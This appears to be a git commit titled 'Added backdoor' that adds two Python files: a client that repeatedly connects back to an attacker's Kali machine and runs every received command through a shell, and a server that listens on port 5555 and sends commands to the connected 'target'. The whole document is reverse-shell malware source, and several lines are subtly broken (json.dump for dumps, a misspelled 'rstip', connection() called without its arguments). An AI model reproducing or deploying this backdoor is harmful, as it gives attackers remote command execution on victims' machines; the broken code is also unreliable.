c1381d8de263276407d068ac8bf8e89a2d61235b
Lucas Victor <lvsxmk23@gmail.com>
2025-11-24 09:53:20 -0300

    Added backdoor

---
+++ Backdoor/backdoor.py
@@ -0,0 +1,42 @@
+import socket
+import time
+import json
+import subprocess
+
+def reliable_send(data):
+    jsondata = json.dump(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode().rstip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def connection(kali_ip, port):
+    while True:
+        time.sleep(20)
+        try:
+            s.connect((kali_ip, port))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+    
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == 'quit':
+            break
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result.decode()
+            reliable_send(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection()
---
+++ Backdoor/server.py
@@ -0,0 +1,34 @@
+import socket
+import json
+
+def reliable_send(data):
+    jsondata = json.dump(data)
+    target.send(jsondata.encode())
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def target_communication(ip):
+    while True:
+        command = input(f'* Shell~{str(ip)}: ')
+        reliable_send(command)
+        if command == "quit":
+            break
+        else:
+            result = reliable_recv()
+            print(result)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+kali_addr = str(input('Insert your kali address:\n'))
+s.bind((kali_addr, 5555))
+print('[+] Listening Connections')
+s.listen(5)
+target, ip = s.accept()
+print(f'[+] Target Connected: {str(ip)}')
+target_communication(ip)
